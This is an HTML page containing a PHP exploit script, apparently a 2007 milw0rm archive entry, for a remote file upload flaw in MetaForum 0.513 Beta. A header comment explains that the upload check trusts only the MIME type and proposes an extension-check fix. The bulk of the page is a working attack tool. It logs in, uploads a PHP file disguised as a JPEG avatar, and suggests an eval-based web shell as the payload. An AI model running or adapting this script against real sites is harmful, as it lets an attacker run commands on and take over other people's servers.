<html><head><title>MetaForum <= 0.513 Beta Remote File Upload Exploit</title></head><pre>&lt;?php
/*---------------------------------------------------------*\
MetaForum &lt;= 0.513 Beta - Remote file upload Vulnerability

[|Description:|]
A security bug has been discovered in MetaForum 0.513 Beta.
This bug can be used by an attacker to upload a malicious php file on the server.
During the upload, the MIME type of the file is the only verified parameter. The extention isn't.
This enables a attacker to fake the MIME type of a php file so that it is considered as an image.

[|Advisory:|]
http://www.aeroxteam.fr/advisory-MetaForum-0.513b.txt

[|Solution:|] (unofficial)
Replace line 110 in the file usercp.php by:
if (($_FILES['imagefile']['type'] == &quot;image/jpeg&quot; || $_FILES['imagefile']['type'] == &quot;image/pjpeg&quot; || $_FILES['imagefile']['type'] == &quot;image/png&quot; || $_FILES['imagefile']['type'] == &quot;image/gif&quot;) &amp;&amp; in_array(strtolower(substr(strrchr($_FILES['imagefile']['name'], '.'),1)), array('gif', 'jpg', 'jpeg', 'png')))

C0d3d by Gu1ll4um3r0m41n (aeroxteam --[at]-- gmail --[dot]-- com)
for AeroX &amp; NeoAlpha (AeroXteam.fr -- Neoalpha.fr)
(C)opyleft 2007
Gr33tz: Math., Syntax ERROR, Barma, NeoMorphS, Snake91, Spamm, Kad, Nitr0, Jethro And everybody from #aerox
\*---------------------------------------------------------*/
if(count($argv) == 6) {
	head();
	echo &quot;PHP code to write (ex: &lt;?php eval(stripslashes(\$_GET['cmd'])); ?&gt;) :\r\n&quot;;
	$phpcode = trim(fgets(STDIN));
	echo &quot;\r\n[+] Connection... &quot;;
	$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die(&quot;Failed\r\n\r\nCould not connect to &quot;.$argv[1].&quot; on the port 80 !&quot;);
	}
	echo &quot;OK\r\n&quot;;
	echo &quot;[+] Login to account... &quot;;
	$reqlogin = &quot;POST &quot;.$argv[2].&quot;index.php?shard=login&amp;action=proc_login HTTP/1.1\r\n&quot;;
	$reqlogin .= &quot;Host: &quot;.$argv[1].&quot;\r\n&quot;;
	$reqlogin .= &quot;Accept: */*\r\n&quot;;
	$reqlogin .= &quot;Connection: Close\r\n&quot;;
	$reqlogin .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$reqlogin .= &quot;Content-Length: &quot;.strlen(&quot;login_name=&quot;.$argv[3].&quot;&amp;login_pass=&quot;.$argv[4]).&quot;\r\n\r\n&quot;;
	$reqlogin .= &quot;login_name=&quot;.$argv[3].&quot;&amp;login_pass=&quot;.$argv[4];
	fwrite($sock, $reqlogin);
	while(!feof($sock)) {
		$buffer = fgets($sock);
		if(preg_match(&quot;`Set-Cookie: &quot;.$argv[5].&quot;userID=(.*?);`&quot;, $buffer, $idtmp)) { $id = $idtmp[1]; }
	}
	if(empty($id)) {
		die(&quot;Failed\r\n\r\nCould not login as &quot;.$argv[3].&quot; !&quot;);
	} else {
		echo &quot;OK\r\n&quot;;
	}
	fclose($sock);

	echo &quot;[+] Sending of the file... &quot;;
	$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die(&quot;Failed\r\n\r\nCould not connect to &quot;.$argv[1].&quot; on the port 80 !&quot;);
	}
	$requp = &quot;POST &quot;.$argv[2].&quot;index.php?shard=usercp&amp;action=g_avatar HTTP/1.1\r\n&quot;;
	$requp .= &quot;Host: &quot;.$argv[1].&quot;\r\n&quot;;
	$requp .= &quot;Accept: */*\r\n&quot;;
	$requp .= &quot;Connection: Close\r\n&quot;;
	$requp .= &quot;Cookie: &quot;.$argv[5].&quot;username=&quot;.$argv[3].&quot;; &quot;.$argv[5].&quot;userID=&quot;.$id.&quot;; &quot;.$argv[5].&quot;password=&quot;.sha1($argv[4]).&quot;\r\n&quot;;
	$requp .= &quot;Content-Type: multipart/form-data; boundary=--------------268742553814512\r\n&quot;;
	$requp2 .= &quot;----------------268742553814512\r\n&quot;;
	$requp2 .= &quot;Content-Disposition: form-data; name=\&quot;upload_flag\&quot;;\r\n\r\n&quot;;
	$requp2 .= &quot;true\r\n&quot;;
	$requp2 .= &quot;----------------268742553814512\r\n&quot;;
	$requp2 .= &quot;Content-Disposition: form-data; name=\&quot;imagefile\&quot;; filename=\&quot;owned.php\&quot;;\r\n&quot;;
	$requp2 .= &quot;Content-Type: image/jpeg\r\n\r\n&quot;;
	$requp2 .= $phpcode.&quot;\r\n&quot;;
	$requp2 .= &quot;----------------268742553814512\r\n&quot;;
	$requp2 .= &quot;Content-Disposition: form-data; name=\&quot;Submit\&quot;;\r\n\r\n&quot;;
	$requp2 .= &quot;Submit\r\n&quot;;
	$requp2 .= &quot;----------------268742553814512--\r\n&quot;;
	$requp .= &quot;Content-Length: &quot;.strlen($requp2).&quot;\r\n\r\n&quot;;
	$requp .= $requp2;
	fwrite($sock, $requp);
	while(!feof($sock)) {
		if(preg_match(&quot;`&lt;img src='images/&quot;.$argv[3].&quot;.php'`&quot;, fgets($sock))) { $ok = 1; }
	}
	if($ok == 1) {
		echo &quot;OK\r\n\r\nYou can access the file at:\r\nhttp://&quot;.$argv[1].$argv[2].&quot;images/&quot;.$argv[3].&quot;.php\r\n\r\nThank for using this exploit !&quot;;
	} else {
		die(&quot;Failed\r\n\r\nMaybe not vulnerable ?!&quot;);
	}
} else {
	usage();
}
function usage() {
	echo &quot;+----------------------------------------------------------------+\r\n&quot;;
	echo &quot;|            MetaForum &lt;= 0.513_beta Remote file upload          |\r\n&quot;;
	echo &quot;|             By Gu1ll4um3r0m41n for AeroX &amp; NeoAlpha            |\r\n&quot;;
	echo &quot;| Usage: php exploit.php site.com /path/ user pass cookie_prefix |\r\n&quot;;
	echo &quot;+----------------------------------------------------------------+\r\n&quot;;
}
function head() {
	echo &quot;+----------------------------------------------+\r\n&quot;;
	echo &quot;|  MetaForum &lt;= 0.513_beta Remote file upload  |\r\n&quot;;
	echo &quot;|   By Gu1ll4um3r0m41n for AeroX &amp; NeoAlpha    |\r\n&quot;;
	echo &quot;+----------------------------------------------+\r\n\r\n&quot;;
}
?&gt;

# milw0rm.com [2007-03-19]</pre></html>